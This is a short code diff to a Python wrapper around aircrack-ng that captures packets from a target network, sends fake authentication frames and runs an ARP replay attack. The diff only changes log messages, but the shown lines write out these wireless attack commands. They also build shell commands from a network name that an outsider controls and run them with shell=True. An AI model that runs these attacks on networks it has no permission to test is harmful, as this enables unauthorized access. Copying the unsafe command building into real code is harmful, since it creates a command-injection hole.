@@ -50,7 +50,7 @@ def network_listening(registered_network):
     BSSID = registered_network._BSSID
     ESSID = registered_network._ESSID
     Channel = registered_network._Channel
-    logging.info("Network listening. File are recorded into TestBox/%s folder.", BSSID)
+    logging.info("Network listening. File are recorded into TestBox/%s folder.", ESSID)
 
     cmd = "airodump-ng -w TestBox/" + ESSID + "/record -d " + BSSID + " mon0 --channel " + str(Channel) +" --ignore-negative-one"
 
@@ -65,7 +65,7 @@ def network_listening(registered_network):
 def keep_alive_packet(box):
     BSSID = box._BSSID
     ESSID = box._ESSID
-    logging.info("Sending keep alive paquets to %s", BSSID)
+    logging.info("Sending keep alive paquets to %s", ESSID)
     cmd = "aireplay-ng -1 6000 -o 1 -q 10 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one"
     FNULL = open(os.devnull, 'w')
     pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
@@ -80,7 +80,7 @@ def arp_attack(registered_network):
     BSSID = registered_network._BSSID
     ESSID = registered_network._ESSID
     Channel = registered_network._Channel
-    logging.info("Arp attack on %s", BSSID)
+    logging.info("Arp attack on %s", ESSID)
 
     cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one";
 
